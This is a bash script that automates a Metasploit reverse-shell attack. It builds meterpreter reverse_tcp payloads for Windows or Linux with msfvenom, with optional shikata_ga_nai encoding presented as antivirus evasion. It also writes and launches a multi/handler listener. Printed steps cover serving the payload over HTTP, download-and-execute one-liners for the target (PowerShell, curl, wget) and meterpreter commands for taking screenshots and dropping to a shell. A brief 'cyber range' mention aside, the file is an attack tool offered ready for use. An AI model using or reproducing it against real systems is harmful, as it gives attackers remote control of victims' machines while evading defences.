#!/bin/bash

# Metasploit Reverse Shell Setup Script
# Automated setup for listener and payload generation

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
clear
echo -e "${BLUE}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║                                                                ║"
echo "║          Metasploit Reverse Shell Automated Setup              ║"
echo "║                                                                ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if msfconsole and msfvenom are installed
echo -e "${YELLOW}[*] Checking for required tools...${NC}"

if ! command -v msfconsole &> /dev/null; then
    echo -e "${RED}[!] Error: msfconsole not found. Please install Metasploit Framework.${NC}"
    exit 1
fi

if ! command -v msfvenom &> /dev/null; then
    echo -e "${RED}[!] Error: msfvenom not found. Please install Metasploit Framework.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Metasploit tools found!${NC}"
echo ""

# ============================================================================
# PART 1: Listener Configuration
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}PART 1: LISTENER CONFIGURATION${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Get listening port
read -p "Enter the listening port (default: 4444): " LPORT
LPORT=${LPORT:-4444}

# Validate port
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
    echo -e "${RED}[!] Invalid port number. Using default 4444.${NC}"
    LPORT=4444
fi

echo -e "${GREEN}[+] Listening port set to: $LPORT${NC}"
echo ""

# Get LHOST (attacker IP)
read -p "Enter your attacker IP address (LHOST): " LHOST

# Validate IP format
if ! [[ "$LHOST" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}[!] Invalid IP address format.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Attacker IP (LHOST) set to: $LHOST${NC}"
echo ""

# ============================================================================
# PART 2: Payload Configuration
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}PART 2: PAYLOAD CONFIGURATION${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Select target OS
echo -e "${YELLOW}Select target operating system:${NC}"
echo "  1) Windows (64-bit)"
echo "  2) Windows (32-bit)"
echo "  3) Linux (64-bit)"
echo "  4) Linux (32-bit)"
echo ""

read -p "Enter choice (1-4): " OS_CHOICE

case $OS_CHOICE in
    1)
        PAYLOAD="windows/meterpreter/reverse_tcp"
        FORMAT="exe"
        OUTPUT_FILE="shell.exe"
        ;;
    2)
        PAYLOAD="windows/meterpreter/reverse_tcp"
        FORMAT="exe"
        OUTPUT_FILE="shell.exe"
        ;;
    3)
        PAYLOAD="linux/x64/meterpreter/reverse_tcp"
        FORMAT="elf"
        OUTPUT_FILE="shell"
        ;;
    4)
        PAYLOAD="linux/x86/meterpreter/reverse_tcp"
        FORMAT="elf"
        OUTPUT_FILE="shell"
        ;;
    *)
        echo -e "${RED}[!] Invalid choice. Using Windows 64-bit.${NC}"
        PAYLOAD="windows/meterpreter/reverse_tcp"
        FORMAT="exe"
        OUTPUT_FILE="shell.exe"
        ;;
esac

echo -e "${GREEN}[+] Target payload set to: $PAYLOAD${NC}"
echo ""

# Ask for custom output filename
read -p "Enter output filename (default: $OUTPUT_FILE): " CUSTOM_FILE
OUTPUT_FILE=${CUSTOM_FILE:-$OUTPUT_FILE}

echo -e "${GREEN}[+] Output file will be: $OUTPUT_FILE${NC}"
echo ""

# Ask about encoding
echo -e "${YELLOW}Enable antivirus evasion encoding?${NC}"
echo "  1) None (fastest, most likely to trigger AV)"
echo "  2) Light (x86/shikata_ga_nai, 3 iterations)"
echo "  3) Medium (x86/shikata_ga_nai, 7 iterations)"
echo "  4) Heavy (x86/shikata_ga_nai, 10 iterations)"
echo ""

read -p "Enter choice (1-4, default: 1): " ENCODING_CHOICE
ENCODING_CHOICE=${ENCODING_CHOICE:-1}

case $ENCODING_CHOICE in
    2)
        ENCODER="-e x86/shikata_ga_nai -i 3"
        echo -e "${GREEN}[+] Light encoding enabled${NC}"
        ;;
    3)
        ENCODER="-e x86/shikata_ga_nai -i 7"
        echo -e "${GREEN}[+] Medium encoding enabled${NC}"
        ;;
    4)
        ENCODER="-e x86/shikata_ga_nai -i 10"
        echo -e "${GREEN}[+] Heavy encoding enabled${NC}"
        ;;
    *)
        ENCODER=""
        echo -e "${GREEN}[+] No encoding${NC}"
        ;;
esac

echo ""

# ============================================================================
# PART 3: Summary and Confirmation
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}CONFIGURATION SUMMARY${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}Listener Settings:${NC}"
echo "  Host (LHOST):    $LHOST"
echo "  Port (LPORT):    $LPORT"
echo ""

echo -e "${YELLOW}Payload Settings:${NC}"
echo "  Payload:         $PAYLOAD"
echo "  Output Format:   $FORMAT"
echo "  Output File:     $OUTPUT_FILE"
echo "  Encoding:        $([ -z "$ENCODER" ] && echo "None" || echo "Enabled")"
echo ""

read -p "Continue with setup? (y/n): " CONFIRM
if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo -e "${RED}[!] Setup cancelled.${NC}"
    exit 0
fi

echo ""

# ============================================================================
# PART 4: Generate Msfconsole RC Script
# ============================================================================
echo -e "${YELLOW}[*] Creating Metasploit handler script...${NC}"

# Create temporary RC file for msfconsole
RC_FILE="/tmp/handler_setup_$$.rc"

cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit
EOF

echo -e "${GREEN}[+] Handler script created at: $RC_FILE${NC}"
echo ""

# ============================================================================
# PART 5: Generate Msfvenom Payload
# ============================================================================
echo -e "${YELLOW}[*] Generating payload with msfvenom...${NC}"
echo ""

MSFVENOM_CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT $ENCODER -o $OUTPUT_FILE"

echo -e "${BLUE}Command:${NC}"
echo "  $MSFVENOM_CMD"
echo ""

eval $MSFVENOM_CMD

if [ -f "$OUTPUT_FILE" ]; then
    FILE_SIZE=$(du -h "$OUTPUT_FILE" | cut -f1)
    echo -e "${GREEN}[+] Payload generated successfully!${NC}"
    echo -e "${GREEN}[+] File: $OUTPUT_FILE (Size: $FILE_SIZE)${NC}"
else
    echo -e "${RED}[!] Error: Payload generation failed.${NC}"
    exit 1
fi

echo ""

# ============================================================================
# PART 6: Instructions for User
# ============================================================================
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}NEXT STEPS${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}STEP 1: Launch the Metasploit Listener${NC}"
echo "  In a terminal window, run:"
echo ""
echo -e "${GREEN}  msfconsole -r $RC_FILE${NC}"
echo ""
echo "  Or manually in msfconsole:"
echo -e "${GREEN}  use exploit/multi/handler"
echo "  set PAYLOAD $PAYLOAD"
echo "  set LHOST $LHOST"
echo "  set LPORT $LPORT"
echo "  exploit${NC}"
echo ""
echo "  Keep this terminal running and waiting for connections."
echo ""

echo -e "${YELLOW}STEP 2: Host the Payload on the Cyber Range Network${NC}"
echo "  In another terminal, run:"
echo ""
echo -e "${GREEN}  python3 -m http.server 8000 --directory .${NC}"
echo ""
echo "  Or for Python 2:"
echo -e "${GREEN}  python -m SimpleHTTPServer 8000${NC}"
echo ""
echo "  This will host files in the current directory at:"
echo -e "${GREEN}  http://<your-ip>:8000/$OUTPUT_FILE${NC}"
echo ""

echo -e "${YELLOW}STEP 3: Download and Execute on Target${NC}"
echo "  On the target machine, download and execute:"
echo ""
if [[ "$OUTPUT_FILE" == *.exe ]]; then
    echo -e "${GREEN}  powershell -Command \"Invoke-WebRequest -Uri http://$LHOST:8000/$OUTPUT_FILE -OutFile $OUTPUT_FILE; .\\$OUTPUT_FILE\"${NC}"
    echo ""
    echo "  Or using curl/wget:"
    echo -e "${GREEN}  curl http://$LHOST:8000/$OUTPUT_FILE -o $OUTPUT_FILE && .\\"$OUTPUT_FILE${NC}"
else
    echo -e "${GREEN}  curl http://$LHOST:8000/$OUTPUT_FILE -o $OUTPUT_FILE && chmod +x $OUTPUT_FILE && ./$OUTPUT_FILE${NC}"
    echo ""
    echo "  Or using wget:"
    echo -e "${GREEN}  wget http://$LHOST:8000/$OUTPUT_FILE && chmod +x $OUTPUT_FILE && ./$OUTPUT_FILE${NC}"
fi
echo ""

echo -e "${YELLOW}STEP 4: Interact with Meterpreter Session${NC}"
echo "  Once connection is established, you'll have a meterpreter prompt:"
echo ""
echo -e "${GREEN}  meterpreter > help                    # List available commands"
echo "  meterpreter > sysinfo                # System information"
echo "  meterpreter > getuid                 # Current user"
echo "  meterpreter > ps                     # List processes"
echo "  meterpreter > screenshot             # Take screenshot"
echo "  meterpreter > shell                  # Drop to system shell${NC}"
echo ""

echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""

# Display cleanup info
echo -e "${YELLOW}Cleanup Information:${NC}"
echo "  Handler RC file: $RC_FILE"
echo "  Payload file:    $OUTPUT_FILE"
echo ""

echo -e "${GREEN}[+] Setup complete! Ready for demo.${NC}"
echo ""

# Optional: Ask if user wants to start listener now
echo -e "${YELLOW}Would you like to start the listener now? (y/n): ${NC}"
read -p "" START_LISTENER

if [[ "$START_LISTENER" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*] Starting Metasploit listener...${NC}"
    echo ""
    msfconsole -r "$RC_FILE"
fi
